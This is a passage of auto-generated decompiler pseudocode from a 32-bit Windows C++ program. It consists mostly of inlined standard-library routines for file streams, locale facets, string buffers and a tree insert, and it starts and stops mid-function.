      v18 = (char **)*Src;
    }
    memset(&v5[(_DWORD)v6], a3, Size);
    result = Src;
    v5[(_DWORD)v18 + Size] = 0;
  }
  return result;
}

//----- (0040B670) --------------------------------------------------------
_DWORD *__thiscall sub_40B670(_DWORD *this, char *a2, int a3, int a4, int a5)
{
  _DWORD *v6; // esi
  int v7; // ecx
  _DWORD *v8; // ecx
  int v9; // eax

  *this = &unk_442324;
  this[26] = &std::ios::`vftable';
  v6 = this + 1;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  sub_40C0C0((struct std::ios_base *)((char *)this + *(_DWORD *)(*this + 4)), (int)(this + 1), 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 104;
  sub_40C000(v6);
  *v6 = &std::filebuf::`vftable';
  sub_40B9B0((int)v6, 0, 0);
  if ( !sub_40BB70(v6, a2, a3 | 2, v7) )
  {
    v8 = (_DWORD *)((char *)this + *(_DWORD *)(*this + 4));
    v9 = v8[3] | 6;
    if ( v8[14] )
      v9 = v8[3] | 2;
    sub_4043E0(v8, v9, 0);
  }
  return this;
}
// 40B733: variable 'v7' is possibly undefined
// 436028: using guessed type void *std::filebuf::`vftable';
// 436068: using guessed type void *std::ios::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442330: using guessed type void *std::ofstream::`vftable';

//----- (0040B7B0) --------------------------------------------------------
_DWORD *__thiscall sub_40B7B0(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)a2 + 12))(a2);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = a2;
    this[3] = this + 1;
    this[4] = this + 2;
    this[7] = this + 5;
    this[8] = this + 6;
    this[11] = this + 9;
    this[12] = this + 10;
    this[2] = 0;
    *(_DWORD *)this[8] = 0;
    *(_DWORD *)this[12] = 0;
    *(_DWORD *)this[3] = 0;
    *(_DWORD *)this[7] = 0;
    result = (_DWORD *)this[11];
    *result = 0;
  }
  return result;
}

//----- (0040B840) --------------------------------------------------------
char __thiscall sub_40B840(char *this)
{
  void **v3; // eax
  unsigned int v4; // edx
  void **v5; // edi
  void **v6; // esi
  int v7; // eax
  int v8; // eax
  bool v9; // zf
  char v10; // bl
  void **v11; // ecx
  size_t v12; // esi
  void **v13; // ecx
  size_t v14; // eax
  void **v15; // ecx
  unsigned int v16; // eax
  void **v17; // [esp+14h] [ebp-2Ch] BYREF
  void *Buffer[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v19; // [esp+2Ch] [ebp-14h]
  int v20; // [esp+3Ch] [ebp-4h]

  if ( !*((_DWORD *)this + 14) || !this[61] )
    return 1;
  if ( (*(int (__thiscall **)(char *, int))(*(_DWORD *)this + 12))(this, -1) == -1 )
    return 0;
  sub_409E40((char **)Buffer, 8u, 0);
  v20 = 0;
LABEL_6:
  v3 = (void **)Buffer[0];
  v4 = v19;
  while ( 1 )
  {
    v5 = Buffer;
    v6 = Buffer;
    if ( v4 >= 0x10 )
    {
      v6 = v3;
      v5 = v3;
    }
    v7 = (*(int (__thiscall **)(_DWORD, char *, void **, char *, void ***))(**((_DWORD **)this + 14) + 32))(
           *((_DWORD *)this + 14),
           this + 64,
           v6,
           (char *)v5 + (unsigned int)Buffer[4],
           &v17);
    if ( !v7 )
    {
      this[61] = 0;
      goto LABEL_14;
    }
    v8 = v7 - 1;
    if ( v8 )
      break;
LABEL_14:
    v4 = v19;
    v11 = Buffer;
    v3 = (void **)Buffer[0];
    if ( v19 >= 0x10 )
      v11 = (void **)Buffer[0];
    v12 = (char *)v17 - (char *)v11;
    if ( v17 != v11 )
    {
      v13 = Buffer;
      if ( v19 >= 0x10 )
        v13 = (void **)Buffer[0];
      v14 = fwrite(v13, 1u, v12, *((FILE **)this + 19));
      v4 = v19;
      v9 = v12 == v14;
      v3 = (void **)Buffer[0];
      if ( !v9 )
        goto LABEL_12;
    }
    if ( !this[61] )
      goto LABEL_23;
    if ( !v12 )
    {
      sub_40B500((char **)Buffer, 8u, 0);
      goto LABEL_6;
    }
  }
  v4 = v19;
  v9 = v8 == 2;
  v3 = (void **)Buffer[0];
  if ( !v9 )
  {
LABEL_12:
    v10 = 0;
    goto LABEL_24;
  }
LABEL_23:
  v10 = 1;
LABEL_24:
  if ( v4 >= 0x10 )
  {
    if ( v4 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)v3 & 0x1F) != 0
        || (v15 = (void **)*(v3 - 1), v15 >= v3)
        || (v16 = (char *)v3 - (char *)v15, v16 < 4)
        || v16 > 0x23 )
      {
        _invalid_parameter_noinfo_noreturn();
      }
      v3 = v15;
    }
    j__free(v3);
  }
  return v10;
}

//----- (0040B9B0) --------------------------------------------------------
int __thiscall sub_40B9B0(int this, FILE *Stream, int a3)
{
  _DWORD *v4; // ecx
  char **v5; // eax
  char **v6; // eax
  int *v7; // eax
  int result; // eax
  int *Count; // [esp+8h] [ebp-10h] BYREF
  char **Pointer; // [esp+Ch] [ebp-Ch] BYREF
  char **Base; // [esp+10h] [ebp-8h] BYREF

  v4 = (_DWORD *)(this + 8);
  *(_BYTE *)(this + 72) = a3 == 1;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 61) = 0;
  *(_DWORD *)(this + 16) = v4;
  *v4 = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  if ( Stream )
  {
    Base = 0;
    Pointer = 0;
    Count = 0;
    _get_stream_buffer_pointers(Stream, &Base, &Pointer, &Count);
    v5 = Base;
    *(_DWORD *)(this + 12) = Base;
    *(_DWORD *)(this + 16) = v5;
    v6 = Pointer;
    *(_DWORD *)(this + 28) = Pointer;
    *(_DWORD *)(this + 32) = v6;
    v7 = Count;
    *(_DWORD *)(this + 44) = Count;
    *(_DWORD *)(this + 48) = v7;
  }
  *(_DWORD *)(this + 76) = Stream;
  *(_DWORD *)(this + 64) = dword_453810;
  result = dword_453814;
  *(_DWORD *)(this + 68) = dword_453814;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 453810: using guessed type int dword_453810;
// 453814: using guessed type int dword_453814;

//----- (0040BAB0) --------------------------------------------------------
int __thiscall sub_40BAB0(int this)
{
  int v2; // edi
  int result; // eax

  if ( *(_DWORD *)(this + 76) )
  {
    v2 = this;
    if ( !sub_40B840((char *)this) )
      v2 = 0;
    if ( fclose(*(FILE **)(this + 76)) )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  *(_BYTE *)(this + 72) = 0;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 16) = this + 8;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 61) = 0;
  *(_DWORD *)(this + 8) = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  result = v2;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 64) = dword_453810;
  *(_DWORD *)(this + 68) = dword_453814;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 453810: using guessed type int dword_453810;
// 453814: using guessed type int dword_453814;

//----- (0040BB70) --------------------------------------------------------
_DWORD *__thiscall sub_40BB70(_DWORD *this, char *a2, int a3, int a4)
{
  FILE *v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  void (__thiscall ***v8)(_DWORD, int); // eax
  char v10[4]; // [esp+Ch] [ebp-18h] BYREF
  int v11; // [esp+10h] [ebp-14h]
  int v12; // [esp+20h] [ebp-4h]

  if ( this[19] )
    return 0;
  v5 = sub_413B3D(a2, a3, 64);
  if ( !v5 )
    return 0;
  sub_40B9B0((int)this, v5, 1);
  v6 = this[13];
  v12 = 0;
  v11 = *(_DWORD *)(v6 + 4);
  (*(void (**)(void))(*(_DWORD *)v11 + 4))();
  v12 = 1;
  v7 = sub_40C4D0((int)v10);
  sub_40B7B0(this, (int)v7);
  v12 = 2;
  if ( v11 )
  {
    v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v11 + 8))(v11);
    if ( v8 )
      (**v8)(v8, 1);
  }
  return this;
}
// 40BB70: using guessed type char var_18[4];

//----- (0040BC40) --------------------------------------------------------
_DWORD *__thiscall sub_40BC40(_DWORD *this, int a2, char a3, int a4)
{
  if ( a4 )
  {
    *this = &unk_442354;
    this[2] = &std::ios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  sub_40C0C0((struct std::ios_base *)((char *)this + *(_DWORD *)(*this + 4)), a2, a3);
  return this;
}
// 436068: using guessed type void *std::ios::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';

//----- (0040BCE0) --------------------------------------------------------
__int64 __thiscall sub_40BCE0(_DWORD **this)
{
  if ( *this[8] )
    return (int)*this[12];
  else
    return 0i64;
}

//----- (0040BD00) --------------------------------------------------------
__int64 __thiscall sub_40BD00(_DWORD **this)
{
  if ( *this[7] )
    return (int)*this[11];
  else
    return 0i64;
}

//----- (0040BD20) --------------------------------------------------------
_DWORD *__thiscall sub_40BD20(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 4353B4: using guessed type void *std::_Facet_base::`vftable';

//----- (0040BD50) --------------------------------------------------------
_DWORD *__thiscall sub_40BD50(_DWORD *this, int a2, int a3)
{
  int v4; // eax
  _DWORD *v6; // [esp+28h] [ebp+8h]

  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 24;
  v4 = *this;
  this[2] = 0;
  this[3] = 0;
  sub_40C0C0((struct std::ios_base *)((char *)this + *(_DWORD *)(v4 + 4)), a2, 0);
  v6 = this + 4;
  *(_DWORD *)((char *)v6 + *(_DWORD *)(this[4] + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v6 + *(_DWORD *)(this[4] + 4) - 4) = *(_DWORD *)(this[4] + 4) - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::iostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 32;
  return this;
}
// 436070: using guessed type void *std::ostream::`vftable';
// 442338: using guessed type void *std::iostream::`vftable';
// 442350: using guessed type void *std::istream::`vftable';

//----- (0040BE10) --------------------------------------------------------
char *__thiscall sub_40BE10(char *this)
{
  int v2; // ecx
  int v3; // ecx
  char *v4; // ecx
  int v5; // edx
  int v6; // ecx
  _BYTE *v8; // [esp+8h] [ebp-18h] BYREF
  char v9; // [esp+Ch] [ebp-14h]
  int v10; // [esp+1Ch] [ebp-4h]

  if ( *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56] )
  {
    sub_40B460(&v8, this);
    v10 = 0;
    if ( v9 )
    {
      v3 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 52))(v3) == -1 )
      {
        v4 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
        v5 = *((_DWORD *)v4 + 3) | 4;
        if ( *((_DWORD *)v4 + 14) )
          v5 = *((_DWORD *)v4 + 3);
        sub_4043E0(v4, v5 | 4, 0);
      }
    }
    v10 = 1;
    if ( !(unsigned __int8)j____uncaught_exception(v2) )
      sub_40BEE0(v8);
    LOBYTE(v10) = 2;
    v6 = *(_DWORD *)&v8[*(_DWORD *)(*(_DWORD *)v8 + 4) + 56];
    if ( v6 )
      (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 8))(v6);
  }
  return this;
}
// 40BE97: variable 'v2' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (0040BEE0) --------------------------------------------------------
int __thiscall sub_40BEE0(_BYTE *this)
{
  int result; // eax
  _DWORD *v3; // ecx
  int v4; // edx
  _DWORD v5[8]; // [esp+0h] [ebp-20h] BYREF

  v5[4] = v5;
  v5[7] = 0;
  result = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( !*(_DWORD *)&this[result + 12] && (this[result + 20] & 2) != 0 )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)&this[result + 56] + 52))(*(_DWORD *)&this[result + 56]);
    if ( result == -1 )
    {
      v3 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
      v4 = v3[3] | 4;
      if ( v3[14] )
        v4 = v3[3];
      return sub_4043E0(v3, v4 | 4, 0);
    }
  }
  return result;
}

//----- (0040BF70) --------------------------------------------------------
char __thiscall sub_40BF70(char *this, int a2)
{
  char *v3; // ecx
  char *v4; // ecx
  int v6; // eax

  v3 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
  if ( !*((_DWORD *)v3 + 3) )
  {
    v4 = (char *)*((_DWORD *)v3 + 15);
    if ( v4 )
      sub_40BE10(v4);
    v3 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
    if ( !*((_DWORD *)v3 + 3) )
      return 1;
  }
  v6 = *((_DWORD *)v3 + 3) | 6;
  if ( *((_DWORD *)v3 + 14) )
    LOBYTE(v6) = v3[12] | 2;
  sub_4043E0(v3, v6, 0);
  return 0;
}

//----- (0040C000) --------------------------------------------------------
_DWORD *__thiscall sub_40C000(_DWORD *this)
{
  _DWORD *v2; // esi

  *this = &std::streambuf::`vftable';
  v2 = operator new(8u);
  *(_QWORD *)v2 = 0i64;
  v2[1] = std::locale::_Init(1);
  this[13] = v2;
  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  return this;
}
// 435FE8: using guessed type void *std::streambuf::`vftable';

//----- (0040C0C0) --------------------------------------------------------
void __thiscall sub_40C0C0(struct std::ios_base *this, int a2, char a3)
{
  _DWORD *v4; // esi
  struct std::_Facet_base *v5; // esi
  void (__thiscall ***v6)(_DWORD, int); // eax
  char v7; // al
  bool v8; // zf
  char v9[4]; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  *((_DWORD *)this + 12) = 0;
  *((_DWORD *)this + 2) = 0;
  *((_DWORD *)this + 4) = 0;
  *((_DWORD *)this + 5) = 513;
  *((_DWORD *)this + 6) = 6;
  *((_DWORD *)this + 7) = 0;
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 10) = 0;
  *((_DWORD *)this + 11) = 0;
  sub_4043E0(this, 0, 0);
  v4 = operator new(8u);
  *(_QWORD *)v4 = 0i64;
  v4[1] = std::locale::_Init(1);
  *((_DWORD *)this + 12) = v4;
  *((_DWORD *)this + 14) = a2;
  *((_DWORD *)this + 15) = 0;
  v11 = 1;
  v10 = v4[1];
  (*(void (**)(void))(*(_DWORD *)v10 + 4))();
  v11 = 2;
  v5 = sub_40C210((int)&savedregs, (int)v9);
  v11 = 3;
  if ( v10 )
  {
    v6 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v6 )
      (**v6)(v6, 1);
  }
  v11 = -1;
  v7 = (*(int (__thiscall **)(struct std::_Facet_base *, int))(*(_DWORD *)v5 + 32))(v5, 32);
  v8 = *((_DWORD *)this + 14) == 0;
  *((_BYTE *)this + 64) = v7;
  if ( v8 )
    sub_4043E0(this, *((_BYTE *)this + 12) | 4, 0);
  if ( a3 )
    std::ios_base::_Addstd(this);
}
// 40C0C0: using guessed type char var_14[4];

//----- (0040C210) --------------------------------------------------------
struct std::_Facet_base *__usercall sub_40C210@<eax>(int a1@<ebp>, int a2)
{
  unsigned int v2; // edi
  int v3; // ecx
  struct std::_Facet_base *v4; // esi
  int v5; // eax
  int v6; // ecx
  char *v7; // eax
  _Ctypevec v8; // xmm0
  _BYTE v10[52]; // [esp-6Ch] [ebp-78h] BYREF
  _Ctypevec v11; // [esp-38h] [ebp-44h] BYREF
  int v12; // [esp-24h] [ebp-30h]
  int v13; // [esp-20h] [ebp-2Ch]
  int v14; // [esp-1Ch] [ebp-28h] BYREF
  _DWORD v15[5]; // [esp-18h] [ebp-24h] BYREF
  int v16; // [esp-4h] [ebp-10h]
  int v17; // [esp+0h] [ebp-Ch]
  int v18; // [esp+4h] [ebp-8h]
  int v19; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v17 = a1;
  v18 = retaddr;
  v16 = -1;
  v15[4] = &loc_4340F7;
  v15[3] = NtCurrentTeb()->NtTib.ExceptionList;
  v15[2] = &v19;
  v12 = a2;
  std::_Lockit::_Lockit((std::_Lockit *)&v14, 0);
  v16 = 0;
  v2 = dword_452940;
  v13 = dword_453804;
  if ( !dword_452940 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v15, 0);
    if ( !dword_452940 )
      dword_452940 = ++dword_452924;
    std::_Lockit::~_Lockit((std::_Lockit *)v15);
    v2 = dword_452940;
  }
  v3 = *(_DWORD *)(a2 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(struct std::_Facet_base **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_413763();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(struct std::_Facet_base **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v13 )
  {
    v4 = (struct std::_Facet_base *)v13;
  }
  else
  {
    v4 = (struct std::_Facet_base *)operator new(0x18u);
    v13 = (int)v4;
    LOBYTE(v16) = 1;
    v6 = *(_DWORD *)(v12 + 4);
    if ( v6 )
    {
      v7 = *(char **)(v6 + 24);
      if ( !v7 )
        v7 = (char *)(v6 + 28);
    }
    else
    {
      v7 = (char *)Locale;
    }
    sub_403B20((struct std::_Locinfo *)v10, v7);
    *((_DWORD *)v4 + 1) = 0;
    *(_DWORD *)v4 = &std::ctype<char>::`vftable';
    v8 = *_Getctype(&v11);
    LOBYTE(v16) = 0;
    *(_Ctypevec *)((char *)v4 + 8) = v8;
    sub_403BE0((std::_Lockit *)v10);
    dword_453804 = (int)v4;
    (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v4 + 4))(v4);
    std::_Facet_Register(v4);
  }
LABEL_20:
  std::_Lockit::~_Lockit((std::_Lockit *)&v14);
  return v4;
}
// 40C210: could not find valid save-restore pair for ebp
// 435F88: using guessed type void *std::ctype<char>::`vftable';
// 452924: using guessed type int dword_452924;
// 453804: using guessed type int dword_453804;

//----- (0040C390) --------------------------------------------------------
int __thiscall sub_40C390(_DWORD *this, int a2, _DWORD *a3)
{
  sub_40C7C0(this, a2, (int)this, a3, a2);
  return a2;
}

//----- (0040C3B0) --------------------------------------------------------
char **__fastcall sub_40C3B0(char **a1, _DWORD *a2, char *a3)
{
  _DWORD *v3; // edi
  size_t *v5; // ebx

  v3 = a2;
  a1[4] = 0;
  a1[5] = (char *)15;
  *(_BYTE *)a1 = 0;
  v5 = a2 + 4;
  sub_40C620(a1, strlen(a3) + a2[4]);
  if ( v3[5] >= 0x10u )
    v3 = (_DWORD *)*v3;
  sub_4036D0(a1, v3, *v5);
  sub_4036D0(a1, a3, strlen(a3));
  return a1;
}

//----- (0040C470) --------------------------------------------------------
int __fastcall sub_40C470(int a1, char **a2, size_t **a3)
{
  size_t *v4; // ecx
  char **v5; // eax

  v4 = (size_t *)a3;
  if ( (unsigned int)a3[5] >= 0x10 )
    v4 = *a3;
  v5 = sub_4036D0(a2, v4, (size_t)a3[4]);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v5;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (char *)15;
  *(_BYTE *)v5 = 0;
  return a1;
}

//----- (0040C4D0) --------------------------------------------------------
_DWORD *__cdecl sub_40C4D0(int a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ecx
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  char *v7; // eax
  char v9[52]; // [esp+10h] [ebp-50h] BYREF
  int v10; // [esp+44h] [ebp-1Ch]
  char v11[4]; // [esp+48h] [ebp-18h] BYREF
  void *Block; // [esp+4Ch] [ebp-14h] BYREF
  int v13; // [esp+5Ch] [ebp-4h]

  v10 = a1;
  std::_Lockit::_Lockit((std::_Lockit *)v11, 0);
  v13 = 0;
  v1 = dword_453864;
  v2 = dword_453808;
  if ( !dword_453864 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)&Block, 0);
    if ( !dword_453864 )
      dword_453864 = ++dword_452924;
    std::_Lockit::~_Lockit((std::_Lockit *)&Block);
    v1 = dword_453864;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v3 + 8) + 4 * v1);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_413763();
  if ( v1 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v5 + 8) + 4 * v1);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v2 )
  {
    v4 = (_DWORD *)v2;
  }
  else
  {
    v4 = operator new(8u);
    Block = v4;
    LOBYTE(v13) = 1;
    v6 = *(_DWORD *)(v10 + 4);
    if ( v6 )
    {
      v7 = *(char **)(v6 + 24);
      if ( !v7 )
        v7 = (char *)(v6 + 28);
    }
    else
    {
      v7 = (char *)Locale;
    }
    sub_403B20((struct std::_Locinfo *)v9, v7);
    v4[1] = 0;
    *v4 = &std::codecvt<char,char,_Mbstatet>::`vftable';
    LOBYTE(v13) = 0;
    sub_403BE0((std::_Lockit *)v9);
    dword_453808 = (int)v4;
    (*(void (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
    std::_Facet_Register((struct std::_Facet_base *)v4);
  }
LABEL_20:
  std::_Lockit::~_Lockit((std::_Lockit *)v11);
  return v4;
}
// 436078: using guessed type void *std::codecvt<char,char,_Mbstatet>::`vftable';
// 452924: using guessed type int dword_452924;
// 453808: using guessed type int dword_453808;
// 40C4D0: using guessed type char var_18[4];

//----- (0040C620) --------------------------------------------------------
void __thiscall sub_40C620(char **this, unsigned int a2)
{
  char *v3; // edx
  unsigned int v4; // ebx
  unsigned int v5; // edx
  char *v6; // eax
  char *v7; // ebx
  char *v8; // eax
  unsigned int v9; // ebx
  char *v10; // ebx
  char *v11; // eax
  unsigned int v12; // ebx
  unsigned int v13; // [esp+8h] [ebp-10h]
  char *v14; // [esp+Ch] [ebp-Ch]
  char *v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+14h] [ebp-4h]
  unsigned int v17; // [esp+14h] [ebp-4h]

  v3 = this[4];
  v15 = v3;
  if ( (unsigned int)v3 <= a2 )
  {
    v4 = (unsigned int)this[5];
    v13 = v4;
    if ( v4 != a2 )
    {
      if ( v4 >= a2 )
      {
        if ( a2 < 0x10 && v4 >= 0x10 )
        {
          v10 = *this;
          memmove_0(this, *this, (size_t)(v3 + 1));
          if ( (unsigned int)(this[5] + 1) >= 0x1000 )
          {
            if ( ((unsigned __int8)v10 & 0x1F) != 0 )
              goto LABEL_30;
            v11 = (char *)*((_DWORD *)v10 - 1);
            if ( v11 >= v10 )
              goto LABEL_30;
            v12 = v10 - v11;
            if ( v12 < 4 || v12 > 0x23 )
              goto LABEL_30;
            v10 = v11;
          }
          j__free(v10);
          this[5] = (char *)15;
        }
      }
      else
      {
        if ( 0x7FFFFFFF - (int)v3 < a2 - (unsigned int)v3 )
          sub_401F10();
        v5 = 0x7FFFFFFF;
        v16 = 0x7FFFFFFF;
        if ( (a2 | 0xF) <= 0x7FFFFFFF )
        {
          v17 = v4 >> 1;
          if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
          {
            v5 = a2 | 0xF;
            if ( (a2 | 0xF) < v4 + v17 )
              v5 = v4 + v17;
          }
          v16 = v5;
        }
        v6 = (char *)sub_401C70(__CFADD__(v5, 1) ? -1 : v5 + 1);
        this[4] = (char *)a2;
        v14 = v6;
        this[5] = (char *)v16;
        if ( v4 >= 0x10 )
        {
          v7 = *this;
          memmove_0(v6, *this, (size_t)(v15 + 1));
          if ( v13 + 1 < 0x1000 )
          {
LABEL_17:
            j__free(v7);
            *this = v14;
            this[4] = v15;
            return;
          }
          if ( ((unsigned __int8)v7 & 0x1F) == 0 )
          {
            v8 = (char *)*((_DWORD *)v7 - 1);
            if ( v8 < v7 )
            {
              v9 = v7 - v8;
              if ( v9 >= 4 && v9 <= 0x23 )
              {
                v7 = v8;
                goto LABEL_17;
              }
            }
          }
LABEL_30:
          _invalid_parameter_noinfo_noreturn();
        }
        memmove_0(v6, this, (size_t)(v15 + 1));
        *this = v14;
        this[4] = v15;
      }
    }
  }
}

//----- (0040C7A0) --------------------------------------------------------
int __stdcall sub_40C7A0(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_Iostream_error_category::`vftable';
  a2[1] = 5;
  return 1;
}
// 435FB8: using guessed type void *std::_Iostream_error_category::`vftable';

//----- (0040C7C0) --------------------------------------------------------
int __thiscall sub_40C7C0(_DWORD *this, int a2, int a3, _DWORD *a4, char a5)
{
  _DWORD *v6; // ecx
  _DWORD *v7; // edx
  _DWORD *v8; // ebx
  char v9; // al
  int *v10; // esi
  _DWORD *v11; // esi
  int j; // eax
  int i; // eax
  int v15; // [esp+0h] [ebp-38h] BYREF
  _DWORD *v16; // [esp+10h] [ebp-28h]
  int v17; // [esp+14h] [ebp-24h]
  int v18; // [esp+18h] [ebp-20h]
  _DWORD *v19; // [esp+1Ch] [ebp-1Ch] BYREF
  _DWORD *v20; // [esp+20h] [ebp-18h]
  int *v21; // [esp+28h] [ebp-10h]
  int v22; // [esp+34h] [ebp-4h]

  v21 = &v15;
  v16 = this;
  v6 = a4;
  v22 = 0;
  v7 = (_DWORD *)*this;
  v8 = v7;
  LOBYTE(v18) = a5;
  v9 = 1;
  v20 = a4;
  v19 = v7;
  v10 = (int *)v7[1];
  LOBYTE(v17) = 1;
  if ( !*((_BYTE *)v10 + 13) )
  {
    do
    {
      v8 = v10;
      v9 = sub_403520(v6, v10 + 4);
      LOBYTE(v17) = v9;
      if ( v9 )
        v10 = (int *)*v10;
      else
        v10 = (int *)v10[2];
      v6 = v20;
    }
    while ( !*((_BYTE *)v10 + 13) );
    v7 = v19;
  }
  v11 = v8;
  if ( v9 )
  {
    if ( v8 == (_DWORD *)*v7 )
    {
      *(_DWORD *)a2 = *sub_40CCD0(v16, &v19, 1, v8, (int)v6, v18);
      *(_BYTE *)(a2 + 4) = 1;
      return a2;
    }
    if ( *((_BYTE *)v8 + 13) )
    {
      v11 = (_DWORD *)v8[2];
    }
    else if ( *(_BYTE *)(*v8 + 13) )
    {
      for ( i = v8[1]; !*(_BYTE *)(i + 13); i = *(_DWORD *)(i + 4) )
      {
        if ( v11 != *(_DWORD **)i )
          break;
        v11 = (_DWORD *)i;
      }
      if ( !*((_BYTE *)v11 + 13) )
        v11 = (_DWORD *)i;
    }
    else
    {
      v11 = (_DWORD *)*v8;
      for ( j = *(_DWORD *)(*v8 + 8); !*(_BYTE *)(j + 13); j = *(_DWORD *)(j + 8) )
        v11 = (_DWORD *)j;
    }
  }
  if ( (unsigned __int8)sub_403520(v11 + 4, v6) )
  {
    *(_DWORD *)a2 = *sub_40CCD0(v16, &v19, v17, v8, (int)v20, v18);
    *(_BYTE *)(a2 + 4) = 1;
  }
  else
  {
    *(_DWORD *)a2 = v11;
    *(_BYTE *)(a2 + 4) = 0;
  }
  return a2;
}

//----- (0040C920) --------------------------------------------------------
char *__fastcall sub_40C920(char *a1, int a2, unsigned int a3)
{
  int v4; // eax
  int v5; // ebx
  int v6; // eax
  unsigned int v7; // esi
  int v8; // esi
  int v9; // ecx
  int v10; // eax
  char *v11; // ecx
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
